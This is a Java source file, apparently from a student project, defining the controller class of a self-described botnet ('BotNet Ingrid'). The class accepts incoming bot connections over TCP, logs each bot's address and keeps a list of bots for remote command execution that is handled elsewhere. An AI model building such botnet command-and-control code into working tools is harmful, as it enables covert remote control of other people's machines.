/*
 * Classe responsavel por gerenciar a BotNet Ingrid
 * Criar um servidor TCP, aguarda novas conexoes de bots
 * Lista bots disponiveis na rede
 * Permite executar comandos remotamente nos bots
 */
package edu.br.utfpr.projectingrid.Core;

import edu.br.utfpr.projectingrid.Setup.Setup;
import edu.br.utfpr.projectingrid.View.BotMasterView;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import javax.swing.JFrame;

/**
 *
 * @author Francisco Xavier 12/05/2018
 */
public class BotMaster extends Thread{
    private static ServerSocket socket;
    private static  BotMaster master;
    private BotMasterView viewBotMaster;

    public ArrayList<BotManager> getBotsConectados() {
        return botsConectados;
    }
    private ArrayList<BotManager> botsConectados;
    
    public BotMaster(BotMasterView viewBotMaster) {

        botsConectados = new ArrayList<BotManager>();
        try {
	    socket = new ServerSocket(Setup.porta);
	} catch (IOException e1) {
	    e1.printStackTrace();
	}
        
	this.viewBotMaster = viewBotMaster;
        System.out.println("BotMaster rodando na porta = "
				+ socket.getLocalPort());
    }
    @Override
    public void run() {
        System.out.println(socket.getInetAddress());
        while (true) {
	    try {
		Socket conexao = socket.accept();
                System.out.println("Bot Connetado");
                //infos da nova conecao
		System.out.println("HOSTNAME = " + conexao.getInetAddress().getHostName());
		System.out.println("HOST ADDRESS = " + conexao.getInetAddress().getHostAddress());
		System.out.println("PORTA LOCAL = " + conexao.getLocalPort());
                System.out.println("PORTA DE CONEXAO = " + conexao.getPort());
		System.out.println("======================================");
                
		BotManager novoBot = new BotManager(conexao);
                novoBot.start();
                botsConectados.add(novoBot);        
                
                viewBotMaster.IngridPrompt("Ingrid:// novo bot connectado...");
                viewBotMaster.novoBot();
	    } catch (IOException e) {
		e.printStackTrace();
            }
	}
    }
}
